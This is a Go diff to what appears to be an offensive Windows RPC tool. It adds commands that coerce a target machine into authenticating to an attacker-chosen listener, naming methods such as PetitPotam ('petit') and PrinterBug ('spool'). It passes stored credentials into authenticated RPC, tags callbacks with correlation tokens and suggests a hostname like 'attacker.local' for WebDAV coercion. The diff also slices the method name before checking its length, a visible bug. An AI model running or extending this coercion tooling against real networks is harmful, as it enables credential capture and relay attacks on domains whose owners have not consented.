@@ -48,6 +48,27 @@ func registerCoerceCommands() {
 		Usage:       "discover <listener> [--interface UUID]",
 		Handler:     cmdDiscover,
 	})
+
+	// Coercion VFS commands (work only in coerce mode)
+	commands.Register(&Command{
+		Name:        "radar",
+		Description: "Show coercion radar summary",
+		Handler:     cmdCoerceRadar,
+	})
+
+	commands.Register(&Command{
+		Name:        "listener",
+		Description: "Set/show default listener for coercion tests",
+		Usage:       "listener [IP]",
+		Handler:     cmdCoerceListener,
+	})
+
+	commands.Register(&Command{
+		Name:        "try",
+		Description: "Test a method for coercion (in coerce mode)",
+		Usage:       "try <opnum> [listener]",
+		Handler:     cmdCoerceTry,
+	})
 }
 
 func cmdPipes(ctx context.Context, args []string) error {
@@ -180,6 +201,11 @@ func cmdCoerce(ctx context.Context, args []string) error {
 	opts := coerce.DefaultCoerceOptions()
 	opts.Verbose = verbose
 
+	// Pass credentials for PKT_PRIVACY authenticated RPC
+	opts.Username = currentUser
+	opts.Password = currentPassword
+	opts.Domain = currentDomain
+
 	for i := 2; i < len(args); i++ {
 		switch args[i] {
 		case "--http":
@@ -205,10 +231,25 @@ func cmdCoerce(ctx context.Context, args []string) error {
 	// Create runner
 	runner := coerce.NewRunner(session, ipcTree)
 
+	// Generate token for correlation (will be embedded in callback path)
+	token := coerce.GenerateToken()
+	methodPrefix := method[:5] // "petit" or "spool" etc
+	if len(method) < 5 {
+		methodPrefix = method
+	}
+	correlationToken := fmt.Sprintf("%s_%s", strings.ToLower(methodPrefix), token)
+	opts.Token = correlationToken // Pass to coercer so it uses the same token
+
 	info_("Executing %s coercion to %s...", method, listener)
+	info_("Correlation token: %s (look for this in your listener)", correlationToken)
 
 	if opts.UseHTTP {
 		info_("Using HTTP/WebDAV mode")
+		// Check if listener looks like an IP - WebClient requires hostname
+		if isIPAddress(listener) {
+			warn_("WARNING: WebClient service only triggers for HOSTNAMES, not IP addresses!")
+			warn_("Use a hostname like 'attacker.local' or configure DNS for your listener")
+		}
 	}
 
 	results, err := runner.Run(ctx, method, listener, opts)
